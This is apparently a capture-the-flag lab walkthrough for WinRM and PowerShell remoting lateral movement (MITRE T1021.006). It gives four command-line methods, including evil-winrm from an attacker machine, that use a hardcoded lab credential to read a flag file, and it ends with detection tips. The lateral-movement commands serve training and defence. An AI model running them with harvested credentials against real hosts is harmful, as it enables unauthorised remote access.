# T1021.006 – WinRM / PowerShell Remoting | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Windows | **MITRE:** T1021.006

## Method 1 – Invoke-Command (One-Shot)
```powershell
$cred = New-Object PSCredential("player", (ConvertTo-SecureString "Player@123!" -AsPlainText -Force))
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    Get-Content "C:\Windows\System32\flag_T1021_006.txt"
}
# HACKTIFY{WINRM_LATERAL_<hostname>}
```

## Method 2 – Enter-PSSession (Interactive)
```powershell
Enter-PSSession -ComputerName localhost -Credential $cred
# [localhost]: PS> Get-Content "C:\Windows\System32\flag_T1021_006.txt"
# [localhost]: PS> exit
```

## Method 3 – Persistent Session
```powershell
$session = New-PSSession -ComputerName localhost -Credential $cred
Invoke-Command -Session $session -ScriptBlock { Get-Content "C:\Windows\System32\flag_T1021_006.txt" }
Invoke-Command -Session $session -ScriptBlock { Get-Process | Select -First 5 }
Remove-PSSession $session
```

## Method 4 – evil-winrm (Red Team Tool)
```bash
# From Linux attacker machine:
evil-winrm -i <target_ip> -u player -p 'Player@123!'
# *Evil-WinRM* PS C:\> type C:\Windows\System32\flag_T1021_006.txt
```

## Detection
- **Event ID 4624** with Logon Type 3 + Process = wsmprovhost.exe
- **WinRM log**: `Microsoft-Windows-WinRM/Operational`
- Monitor port 5985 (HTTP) / 5986 (HTTPS) connections
